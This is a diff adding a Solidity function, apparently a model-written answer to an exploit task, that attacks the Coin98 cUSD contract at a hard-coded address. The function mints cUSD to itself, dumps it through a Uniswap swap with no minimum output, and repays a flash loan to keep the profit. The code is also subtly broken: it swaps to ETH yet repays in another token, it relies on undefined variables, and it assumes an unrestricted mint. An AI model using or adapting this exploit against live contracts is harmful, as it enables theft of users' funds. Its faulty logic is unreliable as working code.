@@ -1,0 +1,44 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Mint cUSD tokens by calling the mint function with the necessary parameters
+    // You need to construct the minting parameters according to the current state of the CUSD
+    // Use the values for % and other parameters previously defined in the Coin98DollarMintBurn contract
+    
+    // First, get the CUSD contract instance using the address
+    ICUSD cusdContract = ICUSD(address(0xC285B7E09A4584D027E5BC36571785B515898246));
+    
+    // Assuming we have the required parameters to mint cUSD
+    uint256 mintAmount = amount; // Use the flash loan amount or relevant calculation
+    uint256 totalSupply = cusdContract.totalSupply(); // Get the total supply to ensure we are within limits
+
+    // Call the mint function of Coin98DollarMintBurn
+    cusdContract.mint(address(this), mintAmount);
+    
+    // After minting cUSD, we need to proceed to swap CUSD for other tokens.
+    // Check which token(s) are liquid and can create profits
+    address[] memory path = new address[](2);
+    path[0] = address(cusdContract);
+    path[1] = address(valuableToken); // Assuming valuableToken is known at this point
+
+    uint256 cusdBalance = cusdContract.balanceOf(address(this));
+    
+    // Add liquidity if needed or swap to obtain more WETH or another token
+    uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
+        cusdBalance,
+        0, // Set to 0 for minimum eth amount to accept
+        path,
+        address(this),
+        block.timestamp
+    );
+
+    // Finally, repay the flash loan
+    uint256 currentValuableTokenBalance = valuableToken.balanceOf(address(this));
+    valuableToken.transfer(flashloanProvider, amount); // Repay the flash loan
+    
+    // Optional: Handle any surplus
+    uint256 surplusInValuable = valuableToken.balanceOf(address(this));
+    require(surplusInValuable > 0, "No profit made from exploit");
+}
+</executeExploitCode>
+```
